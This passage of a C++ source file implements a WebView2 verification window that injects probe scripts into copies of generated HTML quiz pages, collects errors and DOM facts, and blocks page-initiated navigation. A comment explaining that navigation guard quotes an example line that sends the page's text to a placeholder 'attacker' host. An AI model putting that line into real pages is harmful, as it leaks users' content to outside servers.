#include "probe_runner.h"

#include "../app/app.h"
#include "../shell/protocol.h"
#include "../util/file_ops.h"
#include "../util/log.h"
#include "../util/str_util.h"

#include <WebView2EnvironmentOptions.h>
#include <wrl.h>

#include <algorithm>
#include <cctype>
#include <filesystem>
#include <thread>

using Microsoft::WRL::Callback;
using Microsoft::WRL::ComPtr;

namespace isg {

namespace {

constexpr wchar_t kVerifyClass[] = L"ISG_STUDIO_VERIFY_WINDOW";
constexpr wchar_t kBrowserArgs[] =
    L"--disable-features=CalculateNativeWinOcclusion "
    L"--disable-background-timer-throttling";
constexpr int kPollMs = 250;
constexpr int kMaxErrorText = 4000;

LRESULT CALLBACK VerifyWndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    if (msg == WM_CLOSE) {
        ::DestroyWindow(hwnd);
        return 0;
    }
    return ::DefWindowProcW(hwnd, msg, wp, lp);
}

bool ascii_only(const std::wstring& s) {
    for (wchar_t c : s) if (c > 0x7F) return false;
    return true;
}

std::wstring temp_root() {
    wchar_t base[MAX_PATH] = {};
    const DWORD n = ::GetTempPathW(static_cast<DWORD>(std::size(base)), base);
    std::wstring dir = (n > 0) ? std::wstring(base) : std::wstring(L".\\");
    while (!dir.empty() && (dir.back() == L'\\' || dir.back() == L'/')) dir.pop_back();
    return dir;
}

std::string read_asset(const std::wstring& name) {
    const std::wstring dir = skill_dir();
    if (dir.empty()) return std::string();
    std::string text;
    read_file_bytes(dir + L"\\assets\\" + name, text);
    return text;
}

bool has_script_tag(const std::string& code) {
    for (size_t i = 0; i + 1 < code.size(); ++i) {
        if (code[i] != '<') continue;
        size_t j = i + 1;
        while (j < code.size() && (code[j] == ' ' || code[j] == '\t' || code[j] == '/')) ++j;
        if (j + 6 > code.size()) continue;
        std::string word = code.substr(j, 6);
        std::transform(word.begin(), word.end(), word.begin(), [](unsigned char c) {
            return static_cast<char>(std::tolower(c));
        });
        if (word == "script") return true;
    }
    return false;
}

int count_occurrences(const std::string& hay, const std::string& needle) {
    if (needle.empty()) return 0;
    int n = 0;
    for (size_t at = hay.find(needle); at != std::string::npos;
         at = hay.find(needle, at + needle.size())) {
        ++n;
    }
    return n;
}

/* 逐条复刻 oracle 的 verify/inject.js（也等于 skill 的 inject-probe.py）。 */
bool inject_probes(const std::string& html, const std::vector<std::pair<std::string, std::string>>& probes,
                   std::string& out, std::string& why) {
    static const char* kCollector =
        "<script>window.__PROBE_ERRS__=[];window.addEventListener(\"error\",function(e){"
        "if(e&&e.message)window.__PROBE_ERRS__.push(e.message+\"@\"+(e.lineno||0));},true);</script>";
    out = html;
    const std::string meta = "<meta charset=\"utf-8\">";
    if (out.find(meta) != std::string::npos) {
        out.replace(out.find(meta), meta.size(), meta + kCollector);
    } else if (out.find("<head>") != std::string::npos) {
        out.replace(out.find("<head>"), 6, std::string("<head>") + kCollector);
    } else {
        why = "页面里既没有 <meta charset=\"utf-8\"> 也没有 <head>，无处安放错误收集器";
        return false;
    }

    const int bodyEnds = count_occurrences(out, "</body>");
    if (bodyEnds != 1) {
        why = "页面里 </body> 不唯一（出现 " + std::to_string(bodyEnds) + " 次），先人工确认结构";
        return false;
    }
    std::string block;
    for (const auto& p : probes) {
        if (has_script_tag(p.second)) {
            why = "探针「" + p.first + "」的正文里出现了 script 标签字样 —— "
                  "HTML 解析器会在那里提前关闭脚本，整段探针不会执行";
            return false;
        }
        block += "\n<script>\n" + p.second + "\n</script>\n";
    }
    out.replace(out.find("</body>"), 7, block + "</body>");
    return true;
}

/* 与 oracle runner.js 的 DOM_FACTS_JS 同一段脚本（口径：作答点，不是题卡数）。 */
const char* kDomFactsJs = R"JS((function(){try{var pts={};Array.prototype.forEach.call(document.querySelectorAll("script[data-bank]"),function(s){try{JSON.parse(s.textContent).forEach(function(q){if(!q||typeof q!=="object")return;var lv=String(q.lv==null?0:q.lv);pts[lv]=(pts[lv]||0)+((q.type==="big"&&q.parts&&q.parts.length)?q.parts.length:1);});}catch(e){}});var levels=[];Array.prototype.forEach.call(document.querySelectorAll(".cnt[data-cnt]"),function(c){var lv=c.getAttribute("data-cnt"),sec=c.closest?c.closest(".qsec"):null;levels.push({lv:lv,text:(c.textContent||"").trim(),cards:sec?sec.querySelectorAll(".q").length:-1,points:(pts[lv]==null?null:pts[lv])});});var sum=0;for(var k in pts){if(Object.prototype.hasOwnProperty.call(pts,k))sum+=pts[k];}var st=document.getElementById("s-total");return {levels:levels,cards:document.querySelectorAll(".q,.grp").length,bankScripts:document.querySelectorAll("script[data-bank]").length,total:(st?(st.textContent||"").trim():null),totalPoints:sum};}catch(e){return {error:String(e&&e.message||e)};}})())JS";

const char* kErrorsJs = R"JS((function(){try{return {probe:window.__PROBE_ERRS__||[],console:window.__ISG_CONSOLE_ERRORS__||[]};}catch(e){return {probe:[],console:[]};}})())JS";

const char* kConsoleCollector =
    "(function(){try{window.__ISG_CONSOLE_ERRORS__=[];var oe=console.error;"
    "console.error=function(){try{window.__ISG_CONSOLE_ERRORS__.push("
    "Array.prototype.map.call(arguments,function(x){return String(x);}).join(' '));}catch(e){}"
    "return oe.apply(console,arguments);};}catch(e){}})();";

std::string eval_script_for(const Json& demos) {
    return std::string("(function(){var out={groups:[]};var checks=") + json_dump(demos, -1)
         + R"JS(;function fire(el){try{el.dispatchEvent(new Event('input',{bubbles:true}));}catch(e){}try{el.dispatchEvent(new Event('change',{bubbles:true}));}catch(e){}}checks.forEach(function(g,gi){var rec={index:gi,misses:[],read:[]};var sets=g.set||{};Object.keys(sets).forEach(function(id){var el=document.getElementById(id);if(!el){rec.misses.push('找不到滑块 #'+id);return;}el.value=String(sets[id]);fire(el);});var expect=g.expect||{};Object.keys(expect).forEach(function(id){var el=document.getElementById(id);if(!el){rec.misses.push('找不到读数 #'+id);return;}var got=(el.textContent||'').trim();var want=String(expect[id]);rec.read.push({id:id,got:got,want:want});});out.groups.push(rec);});return out;})())JS";
}

std::string truncate(const std::string& s) {
    return s.size() <= kMaxErrorText ? s : s.substr(0, kMaxErrorText) + "…";
}

/* WebView2 的 ExecuteScript 回的是"结果的 JSON 文本"。不同运行时版本对**对象结果**
   有过两种口径：直接给对象 JSON，或把它再包一层字符串。这里两种都认 ——
   只认一种的话，DOM 快照/演示读数会永远解析失败，而探针本身还是绿的
   （症状是"报告里没有顶栏总数"，看起来像页面缺了 #s-total）。 */
bool exec_result_json(LPCWSTR json, Json& out) {
    if (json == nullptr) return false;
    Json v;
    std::string err;
    if (!json_parse(to_utf8(json), v, err)) return false;
    if (v.is_string()) {
        Json inner;
        std::string err2;
        const std::string text = v.get<std::string>();
        if (json_parse(text, inner, err2)) {
            out = std::move(inner);
            return true;
        }
    }
    out = std::move(v);
    return true;
}

}  // namespace

struct ProbeRunner::Core {
    bool alive = true;
    HWND hwnd = nullptr;
    bool classRegistered = false;

    ComPtr<ICoreWebView2Environment> env;
    ComPtr<ICoreWebView2Controller> controller;
    ComPtr<ICoreWebView2> webview;
    bool envCreating = false;
    bool envReady = false;
    bool ctrlCreating = false;
    bool ctrlReady = false;
    std::string envError;

    EventRegistrationToken navStartTok{};
    EventRegistrationToken frameNavTok{};
    EventRegistrationToken navDoneTok{};
    EventRegistrationToken newWinTok{};
    EventRegistrationToken procFailTok{};
    bool navStartHooked = false;
    bool frameNavHooked = false;
    bool navDoneHooked = false;
    bool newWinHooked = false;
    bool procFailHooked = false;
    bool processFailed = false;
    /* 环境/控制器/清浏览数据的回调可能先于/晚于一次失败重试到达。
       每次新建设备就 ++gen；销毁时再 ++gen，回调只认自己那一代。 */
    int gen = 0;

    bool collectorPending = false;
    bool collectorReady = false;

    bool navigating = false;
    bool selfNavigating = false;
    bool loaded = false;
    bool navFailed = false;
    std::wstring loadUrl;

    std::shared_ptr<Active> active;
    std::wstring probeCopy;              // 要加载的页面
    std::wstring probeCopyDir;
    std::wstring tempDir;
    /* ⚠️ demo 核对加载的是**原页面**，不是我们写的副本：收尾时绝不能删它。
       踩过：`probeCopy` 一律删 → 演示核对跑完把用户的成品页面删了。 */
    bool ownsProbeCopy = false;
    std::vector<std::string> warnings;
    bool mSync = false, mAsync = false, mDemo = false, mPet = false;

    int64_t startMs = 0;
    int64_t deadlineMs = 0;
    int64_t lastPollMs = 0;
    bool pollPending = false;
    bool haveTitle = false;
    bool timedOut = false;
    std::string title;

    bool factsPending = false;
    bool haveFacts = false;
    Json facts = Json(nullptr);

    bool errsPending = false;
    bool haveErrs = false;
    Json probeErrs = Json::array();
    Json consoleErrs = Json::array();

    int demoIndex = 0;
    bool demoPending = false;
    bool demoAsked = false;
    Json demoGroups = Json::array();

    bool clearPending = false;
    bool clearIssued = false;
    bool clearDone = false;
    bool needClear = false;
    bool finalizing = false;
    bool pendingOk = false;
    Json pendingData = Json(nullptr);
    std::string pendingError;
};

ProbeRunner::ProbeRunner(HWND notifyHwnd, HINSTANCE hInst)
    : notifyHwnd_(notifyHwnd), hInst_(hInst), core_(std::make_shared<Core>()) {}

ProbeRunner::~ProbeRunner() { Shutdown(); }

void ProbeRunner::Submit(VerifyRequest req, VerifyCallback cb) {
    queue_.emplace_back(std::move(req), std::move(cb));
}

void ProbeRunner::FailRun(Active& a, const std::string& message) {
    FinishRun(a, false, Json(), message);
}

/* 注意：这里**不直接回调**。回包之前还要清浏览数据、删探针副本 ——
   顺序反了的话，下一次校验可能在上一轮的 localStorage 还没清掉时就开始，
   读到的计数就是上一轮的（oracle runner.js 的固定池 + clearStorageData 同一个理由）。 */
void ProbeRunner::FinishRun(Active& a, bool ok, Json data, const std::string& error) {
    if (a.done || core_->finalizing) return;
    a.done = true;
    core_->finalizing = true;
    core_->pendingOk = ok;
    core_->pendingData = std::move(data);
    core_->pendingError = error;
    core_->needClear = core_->ctrlReady && core_->webview != nullptr;
    core_->clearIssued = false;
    core_->clearDone = !core_->needClear;
}

void ProbeRunner::DriveFinalize(int64_t now) {
    Active& a = *active_;
    if (core_->needClear && !core_->clearDone && core_->clearIssued
        && now - core_->startMs > 5000) {
        core_->clearDone = true;
        core_->warnings.push_back("清空校验窗口浏览数据超时（不影响本次结果，下一轮可能读到残留）");
    }
    if (core_->needClear && !core_->clearIssued) {
        core_->clearIssued = true;
        ComPtr<ICoreWebView2_13> v13;
        ComPtr<ICoreWebView2Profile> prof;
        ComPtr<ICoreWebView2Profile2> prof2;
        if (SUCCEEDED(core_->webview.As(&v13)) && v13
            && SUCCEEDED(v13->get_Profile(&prof)) && prof
            && SUCCEEDED(prof.As(&prof2)) && prof2) {
            std::shared_ptr<Core> c = core_;
            const HRESULT hr = prof2->ClearBrowsingDataAll(
                Callback<ICoreWebView2ClearBrowsingDataCompletedHandler>(
                    [c](HRESULT r) -> HRESULT {
                        c->clearDone = true;
                        if (FAILED(r)) c->warnings.push_back("清空校验窗口的浏览数据失败（0x"
                                                            + std::to_string(static_cast<long>(r)) + "）");
                        return S_OK;
                    }).Get());
            if (FAILED(hr)) core_->clearDone = true;
        } else {
            /* 运行时太老、没有 Profile2：不是致命问题，但要如实记一条。 */
            core_->warnings.push_back("这个 WebView2 运行时没有 ClearBrowsingDataAll，"
                                      "校验窗口的存储没有在轮次之间清空");
            core_->clearDone = true;
        }
        if (!core_->clearDone) return;
    }
    if (!core_->clearDone) return;

    DeleteProbeCopy();

    /* 删除副本可能追加"没删干净"的告警；报告数据是在 FinishRun 时序列化的，
       这里必须把最终的 warnings 再写回去，否则用户永远看不到这条。 */
    if (core_->pendingData.is_object() && core_->pendingData.contains("warnings")
        && core_->pendingData["warnings"].is_array()) {
        Json warns = Json::array();
        for (const auto& w : core_->warnings) warns.push_back(w);
        core_->pendingData["warnings"] = std::move(warns);
    }

    VerifyCallback cb = std::move(a.cb);
    const bool ok = core_->pendingOk;
    Json data = std::move(core_->pendingData);
    const std::string error = core_->pendingError;
    core_->finalizing = false;
    core_->needClear = false;
    core_->pendingData = Json(nullptr);
    core_->pendingError.clear();
    active_.reset();
    core_->active.reset();
    if (cb) cb(ok, data, error);
}

void ProbeRunner::DeleteProbeCopy() {
    if (core_->probeCopy.empty()) return;
    if (!core_->ownsProbeCopy) {
        /* demo 核对加载的是原页面：只清指针，绝不删文件。 */
        core_->probeCopy.clear();
        core_->tempDir.clear();
        return;
    }
    const std::wstring copy = core_->probeCopy;
    const std::wstring tmp = core_->tempDir;
    core_->probeCopy.clear();
    core_->tempDir.clear();

    bool ok = remove_file(copy);
    if (tmp.empty()) {
        if (!ok) {
            core_->warnings.push_back("临时探针副本没删干净：" + to_utf8(copy));
        }
        return;
    }
    /* 临时目录是我们自己建的（名字带 pid 与序号）。删目录之前**再断言一次**它落在
       TEMP 根下、名字符合我们的形状 —— 用户要求"删除前先看目标"。 */
    const std::wstring root = temp_root();
    const std::wstring name = file_name(tmp);
    auto lower = [](std::wstring s) {
        std::transform(s.begin(), s.end(), s.begin(), [](wchar_t c) {
            return (c >= L'A' && c <= L'Z') ? static_cast<wchar_t>(c - L'A' + L'a') : c;
        });
        return s;
    };
    const std::wstring lowTmp = lower(tmp);
    const std::wstring lowRoot = lower(root);
    const bool inTemp = !root.empty() && lowTmp.size() > lowRoot.size()
                        && lowTmp.compare(0, lowRoot.size(), lowRoot) == 0;
    const bool ownName = name.rfind(L"isg-probe-", 0) == 0;
    if (ok && inTemp && ownName) {
        std::error_code ec;
        std::filesystem::remove(std::filesystem::path(tmp), ec);   // 只删空目录
    }
    if (!ok) core_->warnings.push_back("临时探针副本没删干净：" + to_utf8(copy));
}

void ProbeRunner::StartNext(int64_t now) {
    if (active_ || queue_.empty() || !core_ || !core_->alive) return;
    auto item = std::move(queue_.front());
    queue_.pop_front();
    auto a = std::make_shared<Active>();
    a->req = std::move(item.first);
    a->cb = std::move(item.second);
    active_ = a;
    core_->active = a;
    core_->warnings.clear();
    core_->probeCopy.clear();
    core_->probeCopyDir.clear();
    core_->tempDir.clear();
    core_->ownsProbeCopy = false;
    core_->title.clear();
    core_->timedOut = false;
    core_->haveTitle = false;
    core_->haveFacts = false;
    core_->facts = Json(nullptr);
    core_->haveErrs = false;
    core_->probeErrs = Json::array();
    core_->consoleErrs = Json::array();
    core_->demoIndex = 0;
    core_->demoPending = false;
    core_->demoAsked = false;
    core_->demoGroups = Json::array();
    core_->clearIssued = false;
    core_->clearDone = false;
    core_->startMs = now;
    core_->deadlineMs = now + std::min(45000, std::max(1000, a->req.timeoutMs));
    core_->lastPollMs = 0;
    core_->loaded = false;
    core_->navFailed = false;
    core_->navigating = false;
    core_->selfNavigating = false;
    core_->finalizing = false;
    core_->needClear = false;

    /* 注入 + 写探针副本 + 放行目录。全部在做任何浏览器动作之前完成 ——
       失败就当场回一条人话，不留下半开的环境。 */
    const std::wstring htmlPath = to_wide(a->req.htmlPath.empty() ? std::string()
                                                                  : a->req.htmlPath);
    const FileInfo info = stat_path(htmlPath);
    if (!info.exists || !info.isFile) {
        FailRun(*a, "被测 HTML 不存在：" + a->req.htmlPath);
        return;
    }

    if (a->req.kind == VerifyRequest::Kind::kProbe) {
        std::string html;
        if (!read_file_bytes(htmlPath, html)) {
            FailRun(*a, "读不出被测 HTML：" + a->req.htmlPath);
            return;
        }
        std::vector<std::pair<std::string, std::string>> probes;
        std::string allCode;
        for (const std::string& name : a->req.probes) {
            const std::string code = read_asset(to_wide(name) + L"-probe.js");
            if (code.empty()) {
                const std::wstring dir = skill_dir();
                FailRun(*a, "读不到探针 " + name + "-probe.js（skill 目录："
                                + (dir.empty() ? std::string("没找到 / ") + skill_dir_error()
                                               : to_utf8(dir)) + "）");
                return;
            }
            probes.emplace_back(name, code);
            allCode += code + "\n";
        }
        core_->mSync = allCode.find("【探针】") != std::string::npos;
        core_->mAsync = allCode.find("【异步·查了") != std::string::npos;
        core_->mDemo = allCode.find("【演示探针】") != std::string::npos;
        core_->mPet = allCode.find("陪练·") != std::string::npos;

        std::string injected;
        std::string why;
        if (!inject_probes(html, probes, injected, why)) {
            FailRun(*a, "探针注入失败：" + why);
            return;
        }

        /* 探针副本要**与页面同目录**：跨目录时页面里相对路径的图片会 404，
           探针会把"陪练/背景"误报成"没有"。目录不可写才退化到 TEMP，并显式告警。 */
        const std::wstring dir = parent_dir(htmlPath);
        static int runToken = 0;
        ++runToken;
        const std::wstring name = L"_probe_" + std::to_wstring(::GetCurrentProcessId())
                                + L"_" + std::to_wstring(runToken) + L"_" + file_name(htmlPath);
        std::wstring target = dir + L"\\" + name;
        if (!write_file_bytes(target, injected)) {
            const std::wstring tmp = temp_root() + L"\\isg-probe-"
                                   + std::to_wstring(::GetCurrentProcessId()) + L"-"
                                   + std::to_wstring(runToken);
            std::error_code ec;
            std::filesystem::create_directories(std::filesystem::path(tmp), ec);
            target = tmp + L"\\" + name;
            if (!write_file_bytes(target, injected)) {
                /* 临时目录已经建出来了，但文件没写成：删掉这个空目录再报错。
                   （刚创建的、名字带 pid 与序号、且只在 TEMP 根下。） */
                std::error_code ec2;
                std::filesystem::remove(std::filesystem::path(tmp), ec2);
                FailRun(*a, "写不出探针副本（同目录与临时目录都失败）");
                return;
            }
            core_->tempDir = tmp;
            core_->warnings.push_back(
                "被测页所在目录不可写（" + to_utf8(dir) + "），探针副本退化到系统临时目录："
                + to_utf8(tmp)
                + "。这会让页面里相对路径引用的图片（陪练形象 / 背景图）加载失败，"
                  "「陪练形象」「背景启用」两项会被误报成\"没有\"，请只把"
                  "「题库解析失败 / 题库条目 / 缺卡 / 脚本错误」当成可信结果。");
        }
        core_->probeCopy = target;
        core_->probeCopyDir = parent_dir(target);
        core_->ownsProbeCopy = true;
        protocol_allow(target);
        protocol_allow(core_->probeCopyDir);
    } else {
        protocol_allow(htmlPath);
        core_->probeCopy = htmlPath;
        core_->probeCopyDir = parent_dir(htmlPath);
    }
}

bool ProbeRunner::EnsureWindow(int64_t) {
    if (!core_ || !core_->alive) return false;
    if (core_->hwnd == nullptr) {
        WNDCLASSEXW wc{};
        wc.cbSize = sizeof(wc);
        wc.lpfnWndProc = &VerifyWndProc;
        wc.hInstance = hInst_;
        wc.hCursor = ::LoadCursorW(nullptr, IDC_ARROW);
        wc.lpszClassName = kVerifyClass;
        if (::RegisterClassExW(&wc) != 0) core_->classRegistered = true;
        else if (::GetLastError() != ERROR_CLASS_ALREADY_EXISTS) {
            core_->envError = "注册校验窗口类失败（" + std::to_string(::GetLastError()) + "）";
            return false;
        }
        core_->hwnd = ::CreateWindowExW(WS_EX_TOOLWINDOW, kVerifyClass, L"ISG 校验",
                                        WS_OVERLAPPEDWINDOW, -32000, -32000, 1100, 900,
                                        nullptr, nullptr, hInst_, nullptr);
        if (core_->hwnd == nullptr) {
            core_->envError = "建不出校验窗口";
            return false;
        }
        ::ShowWindow(core_->hwnd, SW_SHOW);
        ::UpdateWindow(core_->hwnd);
    }
    if (core_->envReady && !core_->ctrlCreating && !core_->ctrlReady) {
        core_->ctrlCreating = true;
        std::shared_ptr<Core> c = core_;
        const int gen = ++core_->gen;
        const HRESULT hr = core_->env->CreateCoreWebView2Controller(
            core_->hwnd,
            Callback<ICoreWebView2CreateCoreWebView2ControllerCompletedHandler>(
                [c, gen](HRESULT r, ICoreWebView2Controller* ctrl) -> HRESULT {
                    if (gen != c->gen || !c->alive || c->hwnd == nullptr) {
                        if (ctrl) ctrl->Close();
                        return S_OK;
                    }
                    c->ctrlCreating = false;
                    if (!c->alive) {
                        if (ctrl) ctrl->Close();
                        return S_OK;
                    }
                    if (FAILED(r) || ctrl == nullptr) {
                        c->envError = "创建校验控制器失败";
                        return S_OK;
                    }
                    c->controller = ctrl;
                    RECT rc{};
                    ::GetClientRect(c->hwnd, &rc);
                    ctrl->put_Bounds(rc);
                    ctrl->put_IsVisible(TRUE);
                    if (FAILED(ctrl->get_CoreWebView2(&c->webview)) || !c->webview) {
                        c->envError = "校验窗口拿不到 ICoreWebView2";
                        return S_OK;
                    }
                    protocol_install(c->webview.Get());

                    /* 导航守卫：页面自己发起的一切跳转/弹窗一律拒绝。
                       生成页的 CSP（default-src 'none'）**管不了导航** ——
                       一句 location.href='https://attacker/?d='+document.body.textContent
                       就能把读到的正文原样发出去。 */
                    c->webview->add_NavigationStarting(
                        Callback<ICoreWebView2NavigationStartingEventHandler>(
                            [c](ICoreWebView2*, ICoreWebView2NavigationStartingEventArgs* args) -> HRESULT {
                                LPWSTR uriRaw = nullptr;
                                std::wstring uri;
                                if (SUCCEEDED(args->get_Uri(&uriRaw)) && uriRaw) {
                                    uri.assign(uriRaw);
                                    ::CoTaskMemFree(uriRaw);
                                }
                                const bool allowed = c->selfNavigating && uri == c->loadUrl;
                                if (!allowed) {
                                    args->put_Cancel(TRUE);
                                    log_warn("[verify] 校验窗口拦截了一次页面跳转：" + to_utf8(uri));
                                }
                                return S_OK;
                            }).Get(), &c->navStartTok);
                    c->navStartHooked = true;

                    c->webview->add_FrameNavigationStarting(
                        Callback<ICoreWebView2NavigationStartingEventHandler>(
                            [c](ICoreWebView2*, ICoreWebView2NavigationStartingEventArgs* args) -> HRESULT {
                                LPWSTR uriRaw = nullptr;
                                std::wstring uri;
                                if (SUCCEEDED(args->get_Uri(&uriRaw)) && uriRaw) {
                                    uri.assign(uriRaw);
                                    ::CoTaskMemFree(uriRaw);
                                }
                                /* 顶层导航与 FrameNavigationStarting 可能都会进来：
                                   自己的那一次放行，子帧/页面发起的重定向一律拒。 */
                                if (!(c->selfNavigating && uri == c->loadUrl)) {
                                    args->put_Cancel(TRUE);
                                }
                                return S_OK;
                            }).Get(), &c->frameNavTok);
                    c->frameNavHooked = true;

                    c->webview->add_NewWindowRequested(
                        Callback<ICoreWebView2NewWindowRequestedEventHandler>(
                            [](ICoreWebView2*, ICoreWebView2NewWindowRequestedEventArgs* args) -> HRESULT {
                                args->put_Handled(TRUE);
                                log_warn("[verify] 校验窗口拦截了一次 window.open");
                                return S_OK;
                            }).Get(), &c->newWinTok);
                    c->newWinHooked = true;

                    c->webview->add_NavigationCompleted(
                        Callback<ICoreWebView2NavigationCompletedEventHandler>(
                            [c](ICoreWebView2*, ICoreWebView2NavigationCompletedEventArgs* args) -> HRESULT {
                                if (!c->alive) return S_OK;
                                BOOL ok = FALSE;
                                args->get_IsSuccess(&ok);
                                c->navigating = false;
                                c->selfNavigating = false;
                                if (ok) c->loaded = true;
                                else c->navFailed = true;
                                return S_OK;
                            }).Get(), &c->navDoneTok);
                    c->navDoneHooked = true;
                    /* 渲染进程崩溃/被杀：没有这条，所有 ExecuteScript 都不会再回调，
                       Tick 会一直等下去（而且队列里后面的请求也不会启动）。 */
                    c->webview->add_ProcessFailed(
                        Callback<ICoreWebView2ProcessFailedEventHandler>(
                            [c](ICoreWebView2*, ICoreWebView2ProcessFailedEventArgs*) -> HRESULT {
                                c->processFailed = true;
                                return S_OK;
                            }).Get(), &c->procFailTok);
                    c->procFailHooked = true;
                    c->ctrlReady = true;
                    return S_OK;
                }).Get());
        if (FAILED(hr)) {
            core_->ctrlCreating = false;
            core_->envError = "创建校验控制器失败（0x" + std::to_string(static_cast<unsigned long>(hr)) + "）";
        }
        return false;
    }
    if (core_->envReady && !core_->ctrlReady) return false;
    if (!core_->envCreating && !core_->envReady && core_->env == nullptr) {
        std::wstring profile = user_data_dir() + L"\\WebView2\\verify";
        if (!ascii_only(profile)) {
            profile = temp_root() + L"\\isg-verify-" + std::to_wstring(::GetCurrentProcessId());
        }
        if (!ascii_only(profile)) {
            core_->envError = "校验环境的 profile 目录含非 ASCII 字符，WebView2 会起不来：" + to_utf8(profile);
            return false;
        }
        std::error_code ec;
        std::filesystem::create_directories(std::filesystem::path(profile), ec);
        auto options = Microsoft::WRL::Make<CoreWebView2EnvironmentOptions>();
        if (!options) {
            core_->envError = "创建校验环境选项失败";
            return false;
        }
        options->put_AdditionalBrowserArguments(kBrowserArgs);
        if (!protocol_register_scheme(options.Get())) {
            core_->envError = "校验环境登记 isg:// 失败";
            return false;
        }
        core_->envCreating = true;
        std::shared_ptr<Core> c = core_;
        const int gen = ++core_->gen;
        const HRESULT hr = ::CreateCoreWebView2EnvironmentWithOptions(
            nullptr, profile.c_str(), options.Get(),
            Callback<ICoreWebView2CreateCoreWebView2EnvironmentCompletedHandler>(
                [c, gen](HRESULT r, ICoreWebView2Environment* env) -> HRESULT {
                    if (gen != c->gen || !c->alive) return S_OK;
                    c->envCreating = false;
                    if (!c->alive) return S_OK;
                    if (FAILED(r) || env == nullptr) {
                        c->envError = "创建校验环境失败（0x"
                                    + std::to_string(static_cast<long>(r)) + "）";
                        return S_OK;
                    }
                    c->env = env;
                    c->envReady = true;
                    return S_OK;
                }).Get());
        if (FAILED(hr)) {
            core_->envCreating = false;
            core_->envError = "创建校验环境失败（0x" + std::to_string(static_cast<unsigned long>(hr)) + "）";
        }
        return false;
    }
    return core_->ctrlReady;
}

void ProbeRunner::Tick(int64_t now) {
    if (!core_ || !core_->alive) return;
    if (core_->finalizing && active_) {
        DriveFinalize(now);
        return;
    }
    if (!active_) {
        if (!queue_.empty()) StartNext(now);
        return;
    }
    Active& a = *active_;
    if (a.done) return;

    if (core_->processFailed) {
        core_->processFailed = false;
        FailRun(a, "校验窗口的渲染进程崩溃了（ProcessFailed）");
        return;
    }
    /* 硬兜底：ExecuteScript / ClearBrowsingData 的回调可能永远不来
       （渲染进程卡死、浏览器进程退出）。到点直接按"没跑完"收工，绝不永久悬挂。 */
    if (now > core_->deadlineMs + 15000) {
        core_->timedOut = true;
        if (a.req.kind == VerifyRequest::Kind::kProbe) {
            core_->haveTitle = true;
            core_->haveFacts = true;
            core_->haveErrs = true;
        } else {
            Json raw = Json::object();
            raw["groups"] = core_->demoGroups;
            raw["durationMs"] = now - core_->startMs;
            raw["timedOut"] = true;
            Json warns = Json::array();
            for (const auto& w : core_->warnings) warns.push_back(w);
            raw["warnings"] = std::move(warns);
            FinishRun(a, true, std::move(raw), std::string());
            return;
        }
    }

    if (!EnsureWindow(now)) {
        if (!core_->envError.empty()) {
            const std::string e = core_->envError;
            core_->envError.clear();
            /* 环境建不起来：关掉已经建好的部分，下一条请求可以重试。
               FinishRun 之后由 DriveFinalize 删探针副本并回包。 */
            DestroyWindowAndEnv();
            FailRun(a, e);
        }
        return;
    }
    if (!core_->ctrlReady) return;

    /* 记录控制台错误：注入在文档创建时运行。 */
    if (!core_->collectorReady) {
        if (now - core_->startMs > 10000) {
            /* 注入控制台收集器失败不该让整轮校验卡死；少收 console.error 而已。 */
            core_->collectorReady = true;
            core_->warnings.push_back("控制台错误收集器没有在 10 秒内装上；这一轮不收集 console.error");
            return;
        }
        if (!core_->collectorPending) {
            core_->collectorPending = true;
            std::shared_ptr<Core> c = core_;
            core_->webview->AddScriptToExecuteOnDocumentCreated(
                to_wide(kConsoleCollector).c_str(),
                Callback<ICoreWebView2AddScriptToExecuteOnDocumentCreatedCompletedHandler>(
                    [c](HRESULT r, LPCWSTR) -> HRESULT {
                        c->collectorPending = false;
                        if (SUCCEEDED(r)) c->collectorReady = true;
                        return S_OK;
                    }).Get());
        }
        return;
    }

    if (!core_->navigating && !core_->loaded && !core_->navFailed) {
        core_->selfNavigating = true;
        core_->loadUrl = to_wide(protocol_url_for(core_->probeCopy));
        core_->navigating = true;
        const HRESULT hr = core_->webview->Navigate(core_->loadUrl.c_str());
        if (FAILED(hr)) {
            core_->navigating = false;
            FailRun(a, "加载被测页失败（0x" + std::to_string(static_cast<unsigned long>(hr)) + "）");
        }
        return;
    }
    if (core_->navigating && now - core_->startMs > 15000) {
        core_->navigating = false;
        core_->navFailed = true;
    }
    if (core_->navFailed) {
        FailRun(a, "加载被测页失败：" + protocol_url_for(core_->probeCopy));
        core_->navFailed = false;
        core_->loaded = false;
        return;
    }
    if (!core_->loaded) return;

    /* 超时只强制"别再等 title"：已经拿到的读数照样交给页面去判定，
       并让报告里出现「探针未跑完」那一条（oracle 也是这么做的）。 */
    if (now >= core_->deadlineMs && !core_->timedOut) {
        core_->timedOut = true;
        if (a.req.kind == VerifyRequest::Kind::kProbe) core_->haveTitle = true;
    }

    if (a.req.kind == VerifyRequest::Kind::kDemo) {
        if (core_->timedOut && core_->demoIndex < static_cast<int>(a.req.demos.size())) {
            Json raw = Json::object();
            raw["groups"] = core_->demoGroups;
            raw["durationMs"] = now - core_->startMs;
            raw["timedOut"] = true;
            Json warns = Json::array();
            for (const auto& w : core_->warnings) warns.push_back(w);
            raw["warnings"] = std::move(warns);
            FinishRun(a, true, std::move(raw), std::string());
            return;
        }
        if (core_->demoIndex >= static_cast<int>(a.req.demos.size())) {
            Json raw = Json::object();
            raw["groups"] = core_->demoGroups;
            raw["durationMs"] = now - core_->startMs;
            raw["timedOut"] = core_->timedOut;
            raw["warnings"] = Json::array();
            for (const auto& w : core_->warnings) raw["warnings"].push_back(w);
            FinishRun(a, true, std::move(raw), std::string());
            return;
        }
        if (core_->demoPending) return;
        if (core_->lastPollMs == 0) core_->lastPollMs = now;
        if (now - core_->lastPollMs < 300) return;   // 演示 IIFE 是同步的，给一拍
        core_->demoPending = true;
        core_->lastPollMs = now;
        /* ⚠️ evalScript 要的是**这一组 checks**，不是 demo 对象本身。
           传错一层时脚本照样跑，只是 `g.set`/`g.expect` 都是 undefined →
           结果永远是"一条读数都没读到"，看起来像元素 id 写错了。 */
        Json checks = Json::array();
        const Json& demo = a.req.demos[core_->demoIndex];
        if (demo.is_object() && demo.contains("checks") && demo["checks"].is_array()) {
            checks = demo["checks"];
        }
        const std::string script = eval_script_for(checks);
        const std::string demoId = (demo.is_object() && demo.contains("id") && demo["id"].is_string())
                                       ? demo["id"].get<std::string>() : std::string();
        log_info("[verify] demo 脚本：" + truncate(script));
        std::shared_ptr<Core> c = core_;
        core_->webview->ExecuteScript(
            to_wide(script).c_str(),
            Callback<ICoreWebView2ExecuteScriptCompletedHandler>(
